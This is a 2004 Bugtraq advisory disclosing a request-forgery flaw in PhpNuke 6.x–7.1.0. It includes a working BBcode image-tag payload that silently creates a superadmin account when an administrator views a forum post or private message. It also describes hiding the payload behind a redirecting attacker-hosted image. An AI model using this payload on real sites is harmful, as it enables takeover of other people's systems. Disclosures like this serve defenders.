
Date: 22 Mar 2004 16:55:40 -0000
From: Janek Vind <come2waraxe@...oo.com>
To: bugtraq@...urityfocus.com
Subject: [waraxe-2004-SA#008 - easy way to get superadmin rights in
    PhpNuke 6.x-7.1.0]






{================================================================================}
{                              [waraxe-2004-SA#008]                              }
{================================================================================}
{                                                                                }
{ [ waraxe-2004-SA#008 - easy way to get superadmin rights in PhpNuke 6.x-7.1.0 ]}
{                                                                                }
{================================================================================}
                                                                                                                                
Author: Janek Vind "waraxe"
Date: 16. March 2004
Location: Estonia, Tartu



Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Php-Nuke is popular freeware content management system, written in php by
Francisco Burzi. This CMS (Content Management System) is used on many thousands
websites, because it`s free of charge, easy to install and has broad set of features.

Homepage: http://phpnuke.org



Vulnerabilities:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This is kind of generic method and it works with many other software too.

First, we must make some posting to the guestbook or forum (PhpBB is integrated to
PhpNuke and in most cases is active module). And besides usual text we use BBcode for
adding "image" with url like that:

admin.php?op=AddAuthor&add_aid=attacker&add_name=God&add_pwd=coolpass&add_email=kala@....ee&add_radminsuper=1

For example in forum:

[img]http://www.victim.com/admin.php?op=AddAuthor&add_aid=attacker&add_name=God&add_pwd=coolpass&add_email=kala@hot.ee&add_radminsuper=1[/img]

Now, after posting, we can see "broken" picture, added to our post. And when person with superadmin rights
will browse forum and read this post, then new superadmin account will be created "automatically".
One more way to attack - send u2u message directly to admin and use described method for message.
When admin reads the u2u message - attacker get's superadmin account.

Now, this is of course most simple method to exploit this weakness. If attacker wants to 
hide the true meaning of the "image", then lets consider something like this:


[img]http://www.attacker.com/images/pic008.jpg[/img]


Is this somehow suspicious picture url? Nop ;)
But wise attacker will use Apache webserver's advanced features and if client's browser will request picture
from attacker's server, then server just redirects the browser to new, "bad" url ;)





Greetings:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    
    Greets to torufoorum staff and to all IT security related people in Estonia! Tervitused!
Special greets to ulljobu!




Contact:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    come2waraxe@...oo.com
    Janek Vind "waraxe"

---------------------------------- [ EOF ] ------------------------------------


